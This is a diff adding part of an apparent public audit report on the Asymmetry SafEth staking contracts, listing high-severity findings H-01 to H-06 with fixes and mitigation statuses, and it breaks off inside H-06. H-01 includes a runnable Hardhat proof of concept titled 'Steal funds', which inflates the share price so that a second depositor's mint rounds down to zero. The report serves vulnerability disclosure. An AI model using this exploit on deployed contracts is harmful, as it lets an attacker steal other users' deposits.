@@ -1,0 +1,267 @@
+[H-01] An attacker can manipulate the preDepositvePrice to steal from other users
+Submitted bymonrel, also found bygiovannidisiena,d3e4,anodaram,ulqiorra,parsely,n33k,Tricko,Haipls,sinarette,nemveer,0xRajkumar,mahdirostami,0xfusion,sashik_eth,Koolex,Vagner,RedTiger,aga7hokakological,bytes032,MiloTruck,pavankv,yac,sinarette,Bahurum,ToonVH,shaka,bart1e,bart1e,juancito,mert_eren,Krace,ck,bin2chen,igingu,AkshaySrivastav,RaymondFam,Cryptor,carrotsmuggler,Dug, andBrenzee
+https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L79https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L98
+Impact
+The first user that stakes can manipulate the total supply of sfTokens and by doing so create a rounding error for each subsequent user. In the worst case, an attacker can steal all the funds of the next user.
+Proof of Concept
+When the first user enters totalSupply is set to 1e18 onL79:
+if(totalSupply==0)preDepositPrice=10**18;// initializes with a price of 1elsepreDepositPrice= (10**18*underlyingValue) /totalSupply;
+But the user can immediately unstake most of his safETH such that totalSupply <<  1e18. The attacker can then transfer increase the underlying amount by transferring derivative tokens to the derivative contracts.
+For subsequent users, the preDepositPrice will be heavily inflated and the calculation of mintAmount onL98:
+uint256mintAmount= (totalStakeValueEth*10**18) /preDepositPrice;
+can be very inaccurate. In the worst case it rounds down to 0 for users that deposit value that is less than the value that the attacker transferred in.
+In the following POC the attacker steals all of the second user’s deposit. The attacker first deposits 100 ETH and immediately removes all but 1 wei. The attacker then transfers 10 wsETH to the WstEth contract. When the second user enters with 1.5 ETH no additional safETH are minted since the minAmount is rounded down to 0. The attacker has all of the safTokens and can withdraw 100% of deposits.
+Create a new test file with the following content to run the POC.
+import{SafEth}from"../typechain-types";import{ethers,upgrades,network}from"hardhat";import{expect}from"chai";import{getAdminAccount,getUserAccounts,getUserBalances,randomStakes,randomUnstakes,}from"./helpers/integrationHelpers";import{getLatestContract}from"./helpers/upgradeHelpers";import{BigNumber}from"ethers";importERC20from"@openzeppelin/contracts/build/contracts/ERC20.json";import{RETH_MAX,WSTETH_ADRESS,WSTETH_WHALE}from"./helpers/constants";describe.only("SafEth POC",function() {letsafEthContractAddress:string;letstrategyContractAddress:string;// create string arrayletderivativesAddress:string[] = [];letstartingBalances:BigNumber[];letnetworkFeesPerAccount:BigNumber[];lettotalStakedPerAccount:BigNumber[];before(async()=>{startingBalances=awaitgetUserBalances();networkFeesPerAccount=startingBalances.map(()=>BigNumber.from(0));totalStakedPerAccount=startingBalances.map(()=>BigNumber.from(0));});it("Should deploy the strategy contract",asyncfunction() {constsafEthFactory=awaitethers.getContractFactory("SafEth");conststrategy= (awaitupgrades.deployProxy(safEthFactory, ["Asymmetry Finance ETH","safETH",]))asSafEth;awaitstrategy.deployed();strategyContractAddress=strategy.address;constowner=awaitstrategy.owner();constderivativeCount=awaitstrategy.derivativeCount();expect(owner).eq((awaitgetAdminAccount()).address);expect(derivativeCount).eq("0");});it("Should deploy derivative contracts and add them to the strategy contract with equal weights",asyncfunction() {constsupportedDerivatives= ["Reth","SfrxEth","WstEth"];conststrategy=awaitgetLatestContract(strategyContractAddress,"SafEth");for(leti=0;i<supportedDerivatives.length;i++) {constderivativeFactory=awaitethers.getContractFactory(supportedDerivatives[i]);constderivative=awaitupgrades.deployProxy(derivativeFactory, [strategyContractAddress,]);constderivativeAddress=derivative.address;derivativesAddress.push(derivativeAddress);awaitderivative.deployed();consttx1=awaitstrategy.addDerivative(derivative.address,"1000000000000000000");awaittx1.wait();}constderivativeCount=awaitstrategy.derivativeCount();expect(derivativeCount).eq(supportedDerivatives.length);});it("Steal funds",asyncfunction() {conststrategy=awaitgetLatestContract(strategyContractAddress,"SafEth");constuserAccounts=awaitgetUserAccounts();lettotalStaked=BigNumber.from(0);constuserStrategySigner=strategy.connect(userAccounts[0]);constuserStrategySigner2=strategy.connect(userAccounts[1]);constethAmount="100";constdepositAmount=ethers.utils.parseEther(ethAmount);totalStaked=totalStaked.add(depositAmount);constbalanceBefore=awaituserAccounts[0].getBalance();conststakeResult=awaituserStrategySigner.stake({value:depositAmount,});constmined=awaitstakeResult.wait();constnetworkFee=mined.gasUsed.mul(mined.effectiveGasPrice);networkFeesPerAccount[0] =networkFeesPerAccount[0].add(networkFee);totalStakedPerAccount[0] =totalStakedPerAccount[0].add(depositAmount);constuserSfEthBalance=awaitstrategy.balanceOf(userAccounts[0].address);constuserSfWithdraw=userSfEthBalance.sub(1);awaitnetwork.provider.request({method:"hardhat_impersonateAccount",params:[WSTETH_WHALE],});constwhaleSigner=awaitethers.getSigner(WSTETH_WHALE);consterc20=newethers.Contract(WSTETH_ADRESS,ERC20.abi,userAccounts[0]);constwderivative=derivativesAddress[2];consterc20BalanceBefore=awaiterc20.balanceOf(wderivative);//remove all but 1 sfTokenconstunstakeResult=awaituserStrategySigner.unstake(userSfWithdraw);consterc20Whale=erc20.connect(whaleSigner);consterc20Amount=ethers.utils.parseEther("10");// transfer tokens directly to the derivative (done by attacker)awaiterc20Whale.transfer(wderivative,erc20Amount);// NEW USER ENTERSconstethAmount2="1.5";constdepositAmount2=ethers.utils.parseEther(ethAmount2);conststakeResu2lt=awaituserStrategySigner2.stake({value:depositAmount2,});constmined2=awaitstakeResult.wait();// User has 0 sfTokens!constuserSfEthBalance2=awaitstrategy.balanceOf(userAccounts[1].address);console.log("userSfEthBalance2: ",userSfEthBalance2.toString());// Attacker has 1 sfTokenconstAttakcerSfEthBalanc=awaitstrategy.balanceOf(userAccounts[0].address);console.log("AttakcerSfEthBalanc: ",AttakcerSfEthBalanc.toString());//Total supply is 1.consttotalSupply=awaitstrategy.totalSupply();console.log("totalSupply: ",totalSupply.toString());});});
+Tools Used
+vscode, hardhat
+Asymmetry mitigated:
+Use internal accounting to get the balance.
+Status:Mitigation confirmed with comments. Full details in reports fromd3e4,adriro, and0x52.
+
+[H-02] A temporary issue shows in the staking functionality which leads to the users receiving less minted tokens
+Submitted byCodingNameKiki, also found bygiovannidisiena,0xd1r4cde17a,shaka,slippopz,MiloTruck,rbserver,MadWookie,adriro,Moliholy,ast3ros,Franfran,gjaldon,bin2chen,koxuan,igingu, andrvierdiiev
+https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L63-L101https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L156-L204https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L211-L216
+Derivative Reth prices
+A quick explanation of the issue causing it, the problem is based on the function “ethPerDerivative” in the Reth derivative.
+As you can see two statements can be triggered here, the first one “if (poolCanDeposit(_amount))” checks if the given amount + the pool balance isn’t greater than the maximumDepositPoolSize and that the amount is greater than the minimum deposit in the pool. Second statement is meant to return a poolPrice which is slightly more than the regular one, because it’s used in order to swap tokens in Uniswap and therefore the price per token is overpriced.
+functionethPerDerivative(uint256_amount)publicviewreturns(uint256) {if(poolCanDeposit(_amount))returnRocketTokenRETHInterface(rethAddress()).getEthValue(10**18);elsereturn(poolPrice() *10**18) / (10**18);}
+// poolCanDeposit() returns:returnrocketDepositPool.getBalance() +_amount<=rocketDAOProtocolSettingsDeposit.getMaximumDepositPoolSize() &&_amount>=rocketDAOProtocolSettingsDeposit.getMinimumDeposit();
+Below you can see the regular price returned in the first statement - 1063960369075232250:
+
+Below you can see the pool price from the second statement, supposed to be used only when a swap is made.
+elsereturn(poolPrice() *10**18) / (10**18);// poolPrice calculates and returnsuint160sqrtPriceX96, , , , , , ) =pool.slot0();return(sqrtPriceX96* (uint(sqrtPriceX96)) * (1e18)) >> (96*2);// uint160 sqrtPriceX96 = 81935751724326368909606241317// return (sqrtPriceX96 * (uint(sqrtPriceX96)) * (1e18)) >> (96 * 2);// return 1069517062752670179 (pool price)// The function "ethPerDerivative" for the else statement return (poolPrice() * 10 ** 18) / (10 ** 18);// Which will be - 1069517062752670179
+Difference between the regular price and the pool price:
+regular price - 1063960369075232250pool price -    1069517062752670179
+Quick Overview
+What can result to users receiving less minted tokens?
+The first thing the staking function does is calculating the derivative underlyingValue. This issue occurs on the Reth derivative, as we can see the staking function calls “ethPerDerivative” to get the price, but takes as account the whole Reth balance of the derivative contract.
+For example let’s say the derivative Reth holds 200e18. The pool has free space for 100e18 more till it reaches its maximum pool size. As the function calls ethPerDerivative with the Reth balance of 200e18 instead of the amount being staked.
+The contract will think there is no more space in the pool (even tho there is 100e18 more) and will return the pool price which is overpriced and meant for the swap in Uniswap.
+underlyingValue+=(derivatives[i].ethPerDerivative(derivatives[i].balance()) *derivatives[i].balance()) /10**18;
+functionethPerDerivative(uint256_amount)publicviewreturns(uint256) {if(poolCanDeposit(_amount))returnRocketTokenRETHInterface(rethAddress()).getEthValue(10**18);elsereturn(poolPrice() *10**18) / (10**18);}// poolCanDeposit(_amount)returnrocketDepositPool.getBalance() +_amount<=rocketDAOProtocolSettingsDeposit.getMaximumDepositPoolSize() &&_amount>=rocketDAOProtocolSettingsDeposit.getMinimumDeposit();
+Let’s follow what actually happens, for now we have wrong overpriced underlying value of the derivative Reth.
+Next the function calculates the preDepositPrice. l will do the real calculations in the POC, but its easy to assume that if the underlyingValue is overpriced the preDepositPrice will be too based on the calculation below.
+elsepreDepositPrice= (10**18*underlyingValue) /totalSupply;
+Let’s say the user deposits 5e18
+Here comes the real problem, so far the function calculates the local variables as there will be swap to Uniswap.
+As mentioned in the beginning the pool has 100e18 free space, so in the deposit function in Reth, the swap to Uniswap will be ignored aspoolCanDeposit(msg.value) == trueand the msg.value will be deposited in the rocket pool.
+uint256depositAmount=derivative.deposit{value:ethAmount}();
+functiondeposit()externalpayableonlyOwnerreturns(uint256) {// Per RocketPool Docs query addresses each time it is usedaddressrocketDepositPoolAddress=RocketStorageInterface(ROCKET_STORAGE_ADDRESS).getAddress(keccak256(abi.encodePacked("contract.address","rocketDepositPool")));RocketDepositPoolInterfacerocketDepositPool=RocketDepositPoolInterface(rocketDepositPoolAddress);if(!poolCanDeposit(msg.value)) {uintrethPerEth= (10**36) /poolPrice();uint256minOut= ((((rethPerEth*msg.value) /10**18) *((10**18-maxSlippage))) /10**18);IWETH(W_ETH_ADDRESS).deposit{value:msg.value}();uint256amountSwapped=swapExactInputSingleHop(W_ETH_ADDRESS,rethAddress(),500,msg.value,minOut);returnamountSwapped;}else{addressrocketTokenRETHAddress=RocketStorageInterface(ROCKET_STORAGE_ADDRESS).getAddress(keccak256(abi.encodePacked("contract.address","rocketTokenRETH")));RocketTokenRETHInterfacerocketTokenRETH=RocketTokenRETHInterface(rocketTokenRETHAddress);uint256rethBalance1=rocketTokenRETH.balanceOf(address(this));rocketDepositPool.deposit{value:msg.value}();uint256rethBalance2=rocketTokenRETH.balanceOf(address(this));require(rethBalance2>rethBalance1,"No rETH was minted");uint256rethMinted=rethBalance2-rethBalance1;return(rethMinted);}}
+Next the function calculates the “derivativeReceivedEthValue”, this time the function ethPerDerivative(depositAmount) will return the normal price as there is space in the pool. Both “derivativeReceivedEthValue” and “totalStakeValueEth” will be calculated based on the normal price.
+uintderivativeReceivedEthValue= (derivative.ethPerDerivative(depositAmount) *depositAmount) /10**18;
+totalStakeValueEth+=derivativeReceivedEthValue;
+If we take the info so far and apply it on the mintAmount calculation below, we know that “totalStakeValueEth” is calculated on the normal price and “preDepositPrice” is calculated on the overpriced pool price. So the user will actually receive less minted shares than he is supposed to get.
+uint256mintAmount= (totalStakeValueEth*10**18) /preDepositPrice;
+Proof of Concept - Part 1
+Will start from the start in order to get the right amounts of “totalSupply” and the Reth balance of derivative.
+So I can show the issue result in POC Part 2.
+The values below are only made for the example.
+Let’s say we have two stakers - Bob and Kiki each depositing 100e18.
+We have only one derivative which is Reth, so it will have 100% weight.
+Bob deposits 100e18 as the first depositer and receives (99999999999999999932) minted tokens of safETH.
+So far after Bob deposit:
+totalSupply = 99999999999999999932
+Reth derivative balance = 93988463204618701706
+uint256underlyingValue=0;uint256totalSupply=0;uint256preDepositPrice=1e18// As we have only derivative Reth in the example, it owns all of the weight.uint256ethAmount= (msg.value*weight) /totalWeight;uint256ethAmount= (100e18*1000) /1000;// not applying the deposit fee in rocketPooluint256depositAmount=derivative.deposit{value:ethAmount}();uint256depositAmount=93988463204618701706uintderivativeReceivedEthValue= (derivative.ethPerDerivative(depositAmount) *depositAmount) /10**18;uintderivativeReceivedEthValue= (1063960369075232250*93988463204618701706) /10**18;uintderivativeReceivedEthValue=99999999999999999932totalStakeValueEth=99999999999999999932;uint256mintAmount= (totalStakeValueEth*10**18) /preDepositPrice;uint256mintAmount= (99999999999999999932*10**18) /1e18;uint256mintAmount=99999999999999999932
+Kiki deposits 100e18 as well and receives (99999999999999999932) minted tokens of safEth.
+So far after Kiki’s deposit:
+totalSupply = 199999999999999999864;
+Reth derivative balance = 187976926409237403412;
+// take the info after bob's deposit and the normal priceunderlyingValue= (derivatives[i].ethPerDerivative(derivatives[i].balance()) *derivatives[i].balance()) /10**18;uint256underlyingValue= (1063960369075232250*93988463204618701706) /10**18;uint256underlyingValue=99999999999999999932;uint256totalSupply=99999999999999999932;uint256preDepositPrice= (10**18*underlyingValue) /totalSupply;uint256preDepositPrice= (10**18*99999999999999999932) /99999999999999999932;uint256preDepositPrice=1e18;// As we have only derivative Reth in the example, it owns all of the weight.uint256ethAmount= (msg.value*weight) /totalWeight;uint256ethAmount= (100e18*1000) /1000;// not applying the deposit fee in rocketPooluint256depositAmount=93988463204618701706uintderivativeReceivedEthValue= (derivative.ethPerDerivative(depositAmount) *depositAmount) /10**18;uintderivativeReceivedEthValue= (1063960369075232250*93988463204618701706) /10**18;uintderivativeReceivedEthValue=99999999999999999932totalStakeValueEth=99999999999999999932;uint256mintAmount= (totalStakeValueEth*10**18) /preDepositPrice;uint256mintAmount= (99999999999999999932*10**18) /1e18;uint256mintAmount=99999999999999999932
+Proof of Concept - Part 2
+From the first POC, we calculated the outcome of 200e18 staked into the Reth derivative. We got the totalSupply and the Reth balance the derivative holds. So we can move onto the main POC, where l can show the difference and how much less minted tokens the user gets.
+totalSupply = 199999999999999999864;Reth derivative balance = 187976926409237403412;
+First l am going to show how much minted tokens the user is supposed to get without applying the issue occurring. And after that l will do the second one and apply the issue. So we can compare the outcomes and see how much less minted tokens the user gets.
+Without the issue occurring, a user deposits 5e18 by calling the staking function. The user received (4999549277935239332) minted tokens of safEth.
+uint256underlyingValue= (derivatives[i].ethPerDerivative(derivatives[i].balance()) *derivatives[i].balance()) /10**18;uint256underlyingValue= (1063960369075232250*187976926409237403412) /10**18;uint256underlyingValue=199999999999999999864;uint256totalSupply=199999999999999999864;uint256preDepositPrice= (10**18*underlyingValue) /totalSupply;uint256preDepositPrice= (10**18*199999999999999999864) /199999999999999999864;uint256preDepositPrice=1e18;// As we have only derivative Reth in the example, it owns all of the weight.uint256ethAmount= (msg.value*weight) /totalWeight;uint256ethAmount= (5e18*1000) /1000;// not applying the deposit fee in rocketPooluint256depositAmount=4698999533488942411uintderivativeReceivedEthValue= (derivative.ethPerDerivative(depositAmount) *depositAmount) /10**18;uintderivativeReceivedEthValue= (1063960369075232250*4698999533488942411) /10**18;uintderivativeReceivedEthValue=4999549277935239332totalStakeValueEth=4999549277935239332;uint256mintAmount= (totalStakeValueEth*10**18) /preDepositPrice;uint256mintAmount= (4999549277935239332*10**18) /1e18;uint256mintAmount=4999549277935239332
+Stats after the deposit without the issue:
+totalSupply = 204999549277935239196Reth derivative balance = 192675925942726345823;
+This time we apply the issue occurring and as the first one a user deposits 5e18 by calling the staking function. The user receives (4973574036557377784) minted tokens of saEth
+uint256underlyingValue= (derivatives[i].ethPerDerivative(derivatives[i].balance()) *derivatives[i].balance()) /10**18;// the function takes as account the pool price here which is overpriced.uint256underlyingValue= (1069517062752670179*187976926409237403412) /10**18;uint256underlyingValue=201044530198482424206uint256totalSupply=199999999999999999864;uint256preDepositPrice= (10**18*underlyingValue) /totalSupply;uint256preDepositPrice= (10**18*201044530198482424206) /199999999999999999864;uint256preDepositPrice=1005222650992412121;// As we have only derivative Reth in the example, it owns all of the weight.uint256ethAmount= (msg.value*weight) /totalWeight;uint256ethAmount= (5e18*1000) /1000;// not applying the deposit fee in rocketPooluint256depositAmount=4698999533488942411// Here the function calculates based on the normal price, as the pool has free space and the user deposits only 5e18.uintderivativeReceivedEthValue= (derivative.ethPerDerivative(depositAmount) *depositAmount) /10**18;uintderivativeReceivedEthValue= (1063960369075232250*4698999533488942411) /10**18;uintderivativeReceivedEthValue=4999549277935239332totalStakeValueEth=4999549277935239332;uint256mintAmount= (totalStakeValueEth*10**18) /preDepositPrice;uint256mintAmount= (4999549277935239332*10**18) /1005222650992412121;uint256mintAmount=4973574036557377784
+Stats after the deposit with the issue:
+totalSupply = 204973574036557377648;Reth derivative balance = 192675925942726345823;
+Difference between outcomes:
+Without the issue based on 5e18 deposit, the user receives -        4999549277935239332 minted tokensWith the issue occurring based on 5e18 deposit, the user receives - 4973574036557377784 minted tokens
+Proof of Concept - Plus
+So far we found that this issue leads to users receiving less minted shares, but let’s go even further and see how much the user losses in terms of ETH. By unstaking the minted amount.
+First we apply the stats without the issue occurring.
+totalSupply = 204999549277935239196Reth derivative balance = 192675925942726345823;
+uint256derivativeAmount= (derivatives[i].balance() *_safEthAmount) /safEthTotalSupply;uint256derivativeAmount= (192675925942726345823*4999549277935239332) /204999549277935239196;uint256derivativeAmount=4698999533488942410;// Eth value based on the current eth price// Reth to Eth value - 4698999533488942410 => 4.999999999999999998 - 8766.85 usd
+Second we apply the stats with the issue occurring.
+totalSupply = 204973574036557377648;Reth derivative balance = 192675925942726345823;
+uint256derivativeAmount= (derivatives[i].balance() *_safEthAmount) /safEthTotalSupply;uint256derivativeAmount= (192675925942726345823*4973574036557377784) /204973574036557377648;uint256derivativeAmount=4675178189396666336;// Eth value based on the current eth price// Reth to Eth value - 4675178189396666336 => 4.974637740558436705 - 8722.41 usd
+Recommended Mitigation Steps
+The problem occurs with calculating the underlyingValue in the staking function. The function “ethPerDerivative” is called with all of the Reth balance, which should not be the case here. Therefore the function calls “poolCanDeposit” in order to check if the pool has space for the Reth derivative balance (Basically the contract thinks that the Reth balance in the derivative will be deposited in the pool, which is not the case here). So even if the pool has space for the depositing amount by the user, the poolCanDeposit(_amount) will return false and the contract will get the poolPrice of the reth which is supposed to be used only for the swap in Uniswap. The contract process executing the staking function with the overpriced pool price and doesn’t perform any swap, but deposits the user funds to the pool.
+underlyingValue+=(derivatives[i].ethPerDerivative(derivatives[i].balance()) *derivatives[i].balance()) /10**18;
+functionethPerDerivative(uint256_amount)publicviewreturns(uint256) {if(poolCanDeposit(_amount))returnRocketTokenRETHInterface(rethAddress()).getEthValue(10**18);elsereturn(poolPrice() *10**18) / (10**18);}
+returnrocketDepositPool.getBalance() +_amount<=rocketDAOProtocolSettingsDeposit.getMaximumDepositPoolSize() &&_amount>=rocketDAOProtocolSettingsDeposit.getMinimumDeposit();
+l’d recommend creating a new function in the reth derivative contract. Which converts the msg.value to reth tokens and using it instead of the whole Reth balance the derivative holds.
+functionrethValue(uint256_amount)publicviewreturns(uint256) {RocketTokenRETHInterface(rethAddress()).getRethValue(amount);}
+Like this we check if the msg.value converted into reth tokens is below the maximumPoolDepositSize and greater than the minimum deposit.
+underlyingValue+=(derivatives[i].ethPerDerivative(derivatives[i].rethValue(msg.value)) *derivatives[i].balance()) /10**18;
+toshiSat (Asymmetry) confirmed
+Picodes (judge) commented:
+This report is great but only tackles a part of the problem: the pricing method is versatile and manipulable, so it can 1 - lead to a loss of funds as show here depending on the condition but more importantly be manipulated easily.
+Asymmetry mitigated:
+Don’t get rETH from pool on deposits.
+Status:Mitigation confirmed with comments. Full details in reports fromd3e4,adriro, and0x52.
+
+[H-03] Users can fail to unstake and lose their deserved ETH because malfunctioning or untrusted derivative cannot be removed
+Submitted byrbserver, also found bytnevler,kaden,0xAgro,Parad0x,bytes032,lukris02,lukris02,P7N8ZK,IgorZuk,DeStinE21,Stiglitz,DadeKuma,J4de,rvierdiiev,koxuan,dec3ntraliz3d,carrotsmuggler,HollaDieWaldfee, andcsanuragjain
+Calling the followingSafEth.adjustWeightfunction can update the weight for an existing derivative to 0. However, there is no way to remove an existing derivative. If the external contracts that an existing derivative depends on malfunction or get hacked, this protocol’s functionalities that need to loop through the existing derivatives can behave unexpectedly. Users can fail to unstake and lose their deserved ETH as one of the severest consequences.
+https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L165-L175
+functionadjustWeight(uint256_derivativeIndex,uint256_weight)externalonlyOwner{weights[_derivativeIndex] =_weight;uint256localTotalWeight=0;for(uint256i=0;i<derivativeCount;i++)localTotalWeight+=weights[i];totalWeight=localTotalWeight;emitWeightChange(_derivativeIndex,_weight);}
+For example, calling the followingSafEth.unstakefunction would loop through all of the existing derivatives and call the corresponding derivative’swithdrawfunction. When theWstEthcontract is one of these derivatives, theWstEth.withdrawfunction would be called, which further callsIStEthEthPool(LIDO_CRV_POOL).exchange(1, 0, stEthBal, minOut). Ifself.is_killedin the stETH-ETH pool contract corresponding toLIDO_CRV_POOLbecomes true, especially after such pool contract becomes compromised or hacked, calling suchexchangefunction would always revert. In this case, calling theSafEth.unstakefunction reverts even though all other derivatives that are not theWstEthcontract are still working fine. Because theSafEth.unstakefunction is DOS’ed, users cannot unstake and withdraw ETH that they are entitled to.
+https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L108-L129
+functionunstake(uint256_safEthAmount)external{require(pauseUnstaking==false,"unstaking is paused");uint256safEthTotalSupply=totalSupply();uint256ethAmountBefore=address(this).balance;for(uint256i=0;i<derivativeCount;i++) {// withdraw a percentage of each asset based on the amount of safETHuint256derivativeAmount= (derivatives[i].balance() *_safEthAmount) /safEthTotalSupply;if(derivativeAmount==0)continue;// if derivative empty ignorederivatives[i].withdraw(derivativeAmount);}...}
+https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L56-L67
+functionwithdraw(uint256_amount)externalonlyOwner{IWStETH(WST_ETH).unwrap(_amount);uint256stEthBal=IERC20(STETH_TOKEN).balanceOf(address(this));IERC20(STETH_TOKEN).approve(LIDO_CRV_POOL,stEthBal);uint256minOut= (stEthBal* (10**18-maxSlippage)) /10**18;IStEthEthPool(LIDO_CRV_POOL).exchange(1,0,stEthBal,minOut);...}
+https://etherscan.io/address/0xDC24316b9AE028F1497c275EB9192a3Ea0f67022#code#L441
+defexchange(i:int128,j:int128,dx:uint256,min_dy:uint256) -> uint256:...assertnotself.is_killed# dev:iskilled
+Proof of Concept
+The following steps can occur for the described scenario.
+TheWstEthcontract is one of the existing derivatives. For theWstEthcontract, the stETH-ETH pool contract corresponding toLIDO_CRV_POOLhas been hacked in which itsself.is_killedhas been set to true.Alice calls theSafEth.unstakefunction but such function call reverts because calling the stETH-ETH pool contract’sexchangefunction reverts for theWstEthderivative.Although all other derivatives that are not theWstEthcontract are still working fine, Alice is unable to unstake. As a result, she cannot withdraw and loses her deserved ETH.
+Tools Used
+VSCode
+Recommended Mitigation Steps
+TheSafEthcontract can be updated to add a function, which would be only callable by the trusted admin, for removing an existing derivative that already malfunctions or is untrusted.
+toshiSat (Asymmetry) confirmed
+Asymmetry mitigated:
+Enable/Disable Derivatives.
+Status:Mitigation confirmed with comments. Full details in reports from d3e4 (hereandhere),adriro, and0x52.
+
+[H-04] Price of sfrxEth derivative is calculated incorrectly
+Submitted bylukris02, also found byjoestakey,rbserver,qpzm,RedTiger,Bauer,T1MOH,dec3ntraliz3d,HollaDieWaldfee,reassor, andkoxuan
+In theethPerDerivative(), the calculatedfrxAmountis multiplied by (10 ** 18) and divided byprice_oracle, but it must be multiplied byprice_oracleand divided by (10 ** 18).
+The impact is severe asethPerDerivative()function is used instake(), one of  two main functions a user will interact with. The value returned byethPerDerivative()affects the calculations ofmintAmount. The incorrect calculation may over or understate the amount of safEth received by the user.
+ethPerDerivative()is also used in thewithdraw()function when calculatingminOut. So, incorrect calculation of ethPerDerivative() may increase/decrease slippage. This can cause unexpected losses or function revert. Ifwithdraw()function reverts, the functionunstake()is unavailable => assets are locked.
+Proof of Concept
+We need to calculate: (10 ** 18) sfrxEth = X Eth.
+For example, weconvertToAssets(10 ** 18)and getfrxAmount= 1031226769652703996.price_oraclereturns 998827832404234820. So, (10 ** 18) frxEth costs 998827832404234820 Eth. Thus, (10 ** 18) sfrxEth costsfrxAmount * price_oracle / 10 ** 18= 1031226769652703996 * 998827832404234820 / 10 ** 18 Eth (1030017999049431492 Eth).
+Butthis function:
+function ethPerDerivative(uint256 _amount) public view returns (uint256) {uint256 frxAmount = IsFrxEth(SFRX_ETH_ADDRESS).convertToAssets(10 ** 18);return ((10 ** 18 * frxAmount) /IFrxEthEthPool(FRX_ETH_CRV_POOL_ADDRESS).price_oracle());}
+calculates the cost of sfrxEth as10 ** 18 * frxAmount / price_oracle= 10 ** 18 * 1031226769652703996 / 998827832404234820 Eth (1032436958800480269 Eth). The current difference ~ 0.23% but it can be more/less.
+Recommended Mitigation Steps
+Changethese lines:
+return ((10 ** 18 * frxAmount) /IFrxEthEthPool(FRX_ETH_CRV_POOL_ADDRESS).price_oracle());
+to:
+return (frxAmount * IFrxEthEthPool(FRX_ETH_CRV_POOL_ADDRESS).price_oracle() / 10 ** 18);
+toshiSat (Asymmetry) disputed via duplicate issue#698
+Asymmetry mitigated:
+To protect against oracle attacks we assume FRX is 1:1 with ETH and revert if the oracle says otherwise since there is no chainlink for FRX.
+Status:Mitigation confirmed with comments. Full details in reports fromd3e4andadriro.
+
+[H-05] RethpoolPricecalculation may overflow
+Submitted byadriro, also found byhassan-truscova,cloudjunky,0x52,anodaram, andT1MOH
+The Reth derivative contract implements thepoolPricefunction to get the spot price of the derivative asset using a Uniswap V3 pool. The function queries the pool to fetch thesqrtPriceX96and does the following calculation:
+https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L228-L242
+functionpoolPrice()privateviewreturns(uint256) {addressrocketTokenRETHAddress=RocketStorageInterface(ROCKET_STORAGE_ADDRESS).getAddress(keccak256(abi.encodePacked("contract.address","rocketTokenRETH")));IUniswapV3Factoryfactory=IUniswapV3Factory(UNI_V3_FACTORY);IUniswapV3Poolpool=IUniswapV3Pool(factory.getPool(rocketTokenRETHAddress,W_ETH_ADDRESS,500));(uint160sqrtPriceX96, , , , , , ) =pool.slot0();return(sqrtPriceX96* (uint(sqrtPriceX96)) * (1e18)) >> (96*2);}
+The main issue here is that the multiplications in the expressionsqrtPriceX96 * (uint(sqrtPriceX96)) * (1e18)may eventually overflow. This case is taken into consideration by the implementation of theOracleLibrary.getQuoteAtTickfunction which is part of the Uniswap V3 periphery set of contracts.
+https://github.com/Uniswap/v3-periphery/blob/main/contracts/libraries/OracleLibrary.sol#L49-L69
+49:functiongetQuoteAtTick(50:int24tick,51:uint128baseAmount,52:addressbaseToken,53:addressquoteToken54:     )internalpurereturns(uint256quoteAmount) {55:uint160sqrtRatioX96=TickMath.getSqrtRatioAtTick(tick);56:57:// Calculate quoteAmount with better precision if it doesn't overflow when multiplied by itself58:if(sqrtRatioX96<=type(uint128).max) {59:uint256ratioX192=uint256(sqrtRatioX96) *sqrtRatioX96;60:quoteAmount=baseToken<quoteToken61:                 ?FullMath.mulDiv(ratioX192,baseAmount,1<<192)62:                 :FullMath.mulDiv(1<<192,baseAmount,ratioX192);63:         }else{64:uint256ratioX128=FullMath.mulDiv(sqrtRatioX96,sqrtRatioX96,1<<64);65:quoteAmount=baseToken<quoteToken66:                 ?FullMath.mulDiv(ratioX128,baseAmount,1<<128)67:                 :FullMath.mulDiv(1<<128,baseAmount,ratioX128);68:         }69:     }
+Note that this implementation guards against different numerical issues. In particular, the if in line 58 checks for a potential overflow ofsqrtRatioX96and switches the implementation to avoid the issue.
+Recommendation
+ThepoolPricefunction can delegate the calculation directly to theOracleLibrary.getQuoteAtTickfunction of thev3-peripherypackage:
+functionpoolPrice()privateviewreturns(uint256) {addressrocketTokenRETHAddress=RocketStorageInterface(ROCKET_STORAGE_ADDRESS).getAddress(keccak256(abi.encodePacked("contract.address","rocketTokenRETH")));IUniswapV3Factoryfactory=IUniswapV3Factory(UNI_V3_FACTORY);IUniswapV3Poolpool=IUniswapV3Pool(factory.getPool(rocketTokenRETHAddress,W_ETH_ADDRESS,500));(,int24tick, , , , , ) =pool.slot0();returnOracleLibrary.getQuoteAtTick(tick,1e18,rocketTokenRETHAddress,W_ETH_ADDRESS);}
+toshiSat (Asymmetry) disputed via duplicate issue#693
+Asymmetry mitigated:
+Using Chainlink to get price instead of poolPrice.
+Status:Mitigation confirmed with comments. Full details in reports fromd3e4,adriro, and0x52.
+
+[H-06]WstEthderivative assumes a~1=1peg of stETH to ETH
+Submitted byadriro, also found bymonrel,0xepley,tnevler,MiloTruck,sinarette,handsomegiraffe,auditor0517,0xRajkumar,Emmanuel,rbserver,rbserver,eyexploit,0xMirce,lukris02,Tricko,IgorZuk,Franfran,Bahurum,Bahurum,shaka,peanuts,jasonxiale,nadin,RedTiger,NoamYakov,Ruhum,BPZ,y1cunhui,Bauer,bin2chen,koxuan,igingu,T1MOH,rvierdiiev,rvierdiiev,HollaDieWaldfee,carrotsmuggler,Co0nan, andad3sh_
+TheWstEthcontract implements the ETH derivative for the Lido protocol. The stETH token is the liquid representation of the ETH staked in this protocol.
